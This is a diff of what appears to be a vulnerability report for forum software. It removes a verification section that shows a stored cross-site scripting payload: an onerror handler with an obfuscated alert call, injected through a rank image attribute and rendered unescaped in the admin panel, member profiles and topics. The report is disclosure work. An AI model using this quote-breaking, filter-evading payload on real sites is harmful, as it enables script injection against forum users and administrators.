@@ -52,27 +52,6 @@ GET <BASE_URL>/viewtopic.php?t=<TOPIC_ID>
 
 Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.
 
-## Fresh verification evidence
-
-| Run | Marker | Observation | Result |
-| --- | --- | --- | --- |
-| 1 | `gt481023pba` | DB hit + ACP/member/topic | **PASS** |
-| 2 | `gt481023pbb` | DB hit + ACP/member/topic | **PASS** |
-| 3 | `gt481023pbc` | DB hit + ACP/member/topic | **PASS** |
-
-```text
-Saved run-3 responses (same unescaped attribute in all sinks):
-
-ACP:
-<img src="./../images/ranks/r.svg" onerror = self[`al`+`ert`](`gt481023pbc`) x=".svg" ...>
-
-Member profile and topic:
-<img src="./images/ranks/r.svg" onerror = self[`al`+`ert`](`gt481023pbc`) x=".svg" ...>
-
-The database value contained the literal quote-breaking string.
-```
-
-The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.
 
 ## Confirmed source and Sink
 
